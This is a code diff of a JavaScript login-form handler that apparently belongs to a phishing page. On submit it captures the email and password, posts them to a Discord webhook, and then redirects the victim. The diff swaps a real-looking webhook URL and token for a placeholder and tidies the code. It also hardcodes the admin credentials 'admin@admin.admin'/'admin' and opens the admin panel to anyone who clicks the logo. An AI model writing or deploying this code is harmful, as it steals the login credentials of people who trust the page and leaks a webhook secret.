@@ -1,49 +1,50 @@
-// Function to handle form submission
 document.addEventListener('DOMContentLoaded', function() {
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
+    const loginForm = document.getElementById('loginForm');
+
+    loginForm.addEventListener('submit', function(event) {
         event.preventDefault();
 
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
 
-        // Check for admin credentials
+        // Check if admin credentials are entered
         if (email === 'admin@admin.admin' && password === 'admin') {
-            window.location.href = "admin.html";
+            window.location.href = 'admin.html'; // Redirect to admin panel
             return;
         }
 
-        // Combine email and password into an object
-        const user = {
-            email: email,
-            password: password
-        };
+        // Send user data to Discord webhook
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
 
-        // Send user data to the Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1250446588254359583/hWxJFMMwp2NpIx6vq7-pZe_rrQ9sjOm3LxtSZcv6D1bv2uiwMgYNYglzJvHZSctThByk';
         const message = `**Email= ||${email}||\nPass= ||${password}||**`;
 
         fetch(webhookUrl, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json'
+                'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ content: message })
-        }).then(response => {
-            if (response.ok) {
-                console.log('Data sent to Discord webhook successfully');
-            } else {
-                console.error('Failed to send data to Discord webhook');
-            }
-        }).catch(error => {
-            console.error('Error sending data to Discord webhook:', error);
+            body: JSON.stringify({ content: message }),
+        })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Data sent to Discord webhook successfully');
+                } else {
+                    console.error('Failed to send data to Discord webhook');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending data to Discord webhook:', error);
+            });
+
+        // Redirect user to 10.html
+        window.location.href = '10.html';
+    });
+
+    // Redirect to admin panel when clicking the logo
+    const logo = document.querySelector('.logo');
+    if (logo) {
+        logo.addEventListener('click', function() {
+            window.location.href = 'admin.html';
         });
-
-        // Redirect to 10.html
-        window.location.href = "10.html";
-    });
-
-    // Function to redirect to admin page
-    document.querySelector('.logo').addEventListener('click', function() {
-        window.location.href = 'admin.html';
-    });
+    }
 });
